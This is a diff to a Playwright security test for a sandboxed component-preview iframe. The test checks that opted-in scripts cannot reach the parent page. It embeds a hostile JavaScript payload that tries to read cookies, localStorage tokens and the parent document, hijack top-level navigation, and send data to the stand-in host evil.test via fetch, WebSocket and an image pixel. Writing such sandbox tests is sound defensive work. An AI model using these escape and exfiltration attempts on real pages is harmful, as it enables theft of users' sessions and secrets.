@@ -4,7 +4,7 @@
  * (public/_headers) and embeds hostile HTML/CSS exactly as PreviewFrame does.
  */
 import { expect, test, type Frame, type Request } from '@playwright/test'
-import { buildPreviewDocument, PREVIEW_SANDBOX } from '../../src/shared/preview'
+import { buildPreviewDocument, PREVIEW_SANDBOX, PREVIEW_SANDBOX_WITH_SCRIPTS } from '../../src/shared/preview'
 
 const ORIGIN = 'https://app.test'
 
@@ -118,4 +118,74 @@ test('the preview frame is created with an empty sandbox', async ({ page }) => {
   const requests: Request[] = []
   page.on('request', (r) => requests.push(r))
   expect(requests).toHaveLength(0)
+})
+
+// Scripts opted in: the sandbox gains exactly allow-scripts (never allow-same-origin).
+const HOSTILE_JS = `
+const results = {}
+const attempt = (name, fn) => { try { results[name] = String(fn()) } catch (e) { results[name] = 'blocked' } }
+attempt('parentTitle', () => window.parent.document.title)
+attempt('parentWrite', () => { window.parent.document.title = 'pwned-js'; return 'wrote' })
+attempt('cookie', () => document.cookie)
+attempt('localStorage', () => localStorage.getItem('token'))
+attempt('indexedDB', () => indexedDB.open('x') && 'opened')
+attempt('popup', () => window.open('https://evil.test/popup') === null ? 'blocked' : 'opened')
+attempt('topNav', () => { window.top.location.href = 'https://evil.test/top'; return 'navigated' })
+attempt('alert', () => { alert('hi'); return 'shown' })
+fetch('https://evil.test/fetch').then(() => { results.fetch = 'sent' }).catch(() => { results.fetch = 'blocked' })
+try { const ws = new WebSocket('wss://evil.test/ws'); ws.onerror = () => {} } catch (e) {}
+new Image().src = 'https://evil.test/pixel-from-js.png'
+window.parent.postMessage({ steal: true }, '*')
+setTimeout(() => { document.body.dataset.results = JSON.stringify(results); document.body.dataset.ran = 'yes' }, 300)
+`
+
+test('opted-in component JavaScript runs but cannot escape the sandbox', async ({ page, context }) => {
+  const offOrigin: string[] = []
+  await context.route('**/*', async (route) => {
+    const url = new URL(route.request().url())
+    if (url.origin === ORIGIN) {
+      return route.fulfill({
+        status: 200,
+        contentType: 'text/html',
+        headers: { 'Content-Security-Policy': "object-src 'none'; base-uri 'self'; frame-ancestors 'none'", 'X-Frame-Options': 'DENY' },
+        body: PARENT_HTML.replace('sandbox=""', `sandbox="${PREVIEW_SANDBOX_WITH_SCRIPTS}"`),
+      })
+    }
+    offOrigin.push(url.href)
+    return route.abort()
+  })
+  const popups: string[] = []
+  context.on('page', (p) => popups.push(p.url()))
+  const dialogs: string[] = []
+  page.on('dialog', (d) => { dialogs.push(d.message()); void d.dismiss() })
+
+  await page.goto(`${ORIGIN}/`)
+  await page.evaluate(() => {
+    document.cookie = 'session=parent-secret; path=/'
+    localStorage.setItem('token', 'parent-secret')
+  })
+  await page.evaluate((doc) => {
+    ;(document.getElementById('preview') as HTMLIFrameElement).srcdoc = doc
+  }, buildPreviewDocument({ html: '<h1 id="ok">Scripted component</h1>', css: '', js: HOSTILE_JS, runScripts: true }))
+
+  const preview = page.frameLocator('#preview')
+  await expect(preview.locator('body')).toHaveAttribute('data-ran', 'yes', { timeout: 10_000 })
+  const frame = page.frames().find((f) => f !== page.mainFrame()) as Frame
+  const results = JSON.parse((await frame.evaluate(() => document.body.dataset.results)) ?? '{}')
+
+  expect(results).toMatchObject({
+    parentTitle: 'blocked',
+    parentWrite: 'blocked',
+    cookie: 'blocked',
+    localStorage: 'blocked',
+    indexedDB: 'blocked',
+    popup: 'blocked',
+    topNav: 'blocked',
+    fetch: 'blocked',
+  })
+  expect(dialogs).toEqual([]) // no allow-modals: alert() is ignored
+  expect(popups).toEqual([])
+  expect(page.url()).toBe(`${ORIGIN}/`)
+  expect(await page.title()).toBe('Parent')
+  expect(offOrigin, `off-origin requests: ${offOrigin.join(', ')}`).toEqual([])
 })
